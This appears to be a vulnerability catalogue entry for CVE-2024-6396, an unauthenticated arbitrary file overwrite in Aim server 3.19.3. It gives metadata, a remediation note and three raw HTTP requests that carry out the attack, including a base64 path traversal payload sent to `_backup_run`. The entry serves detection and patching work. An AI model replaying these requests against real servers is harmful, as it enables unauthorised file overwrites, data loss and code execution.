---
layout: post
cve_id: CVE-2024-6396
title: Aimhubio Aim Server 3.19.3 - Arbitrary File Overwrite
pcap: true
pcap_path: /pcaps/2024/CVE-2024-6396.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-6396.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Unauthenticated attackers can overwrite arbitrary files on the host server
  and exfiltrate data by manipulating the _backup_run function parameters, potentially
  achieving denial of service, data loss, or remote code execution.

  '
remediation: 'Update Aimhubio Aim to version 3.19.4 or later to address the arbitrary
  file overwrite vulnerability.

  '
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-6396
  cwe-id: CWE-29
  epss-score: 0.9083
  epss-percentile: 0.99604
  cpe: cpe:2.3:a:aimstack:aim:*:*:*:*:*:*:*:*
metadata:
  max-request: 3
  verified: true
  fofa-query: icon_hash="-1047157256"
  product: aim
  vendor: aimstack
tags:
- cve
- cve2024
- aim
- aimhubio
- file-write
- vkev
- vuln
---

## üîç Vulnerability Description
A vulnerability in the `_backup_run` function in aimhubio/aim version 3.19.3 allows remote attackers to overwrite any file on the host server and exfiltrate arbitrary data. The vulnerability arises due to improper handling of the `run_hash` and `repo.path` parameters, which can be manipulated to create and write to arbitrary file paths. This can lead to denial of service by overwriting critical system files, loss of private data, and potential remote code execution.


## üåê HTTP Request
```nohighlight
POST /tracking/client_1/get-resource HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
Connection: close
Content-Length: 94
Content-Type: application/json
Accept-Encoding: gzip
{
"resource_handler": "my_resource",
"resource_type": "Repo",
"args": "AAAAAAABAAAABw=="
}
```

```nohighlight
POST /tracking/client_1/read-instruction HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Content-Length: 223
Content-Type: application/json
Accept-Encoding: gzip
{
"resource_handler": "my_resource",
"method_name": "_backup_run",
"args": "AAAAAAABAAAABgoAAAD+AAAAAAAAAAD+AEsAAAAELi4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9weXRob24zLjkvc2l0ZS1wYWNrYWdlcy9haW1fdWkvYnVpbGQvQW1obHgxaC50eHQ="
}
```

```nohighlight
GET /static-files/mCJFWUQT.txt HTTP/1.1
Host: www.victim.com:43800
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

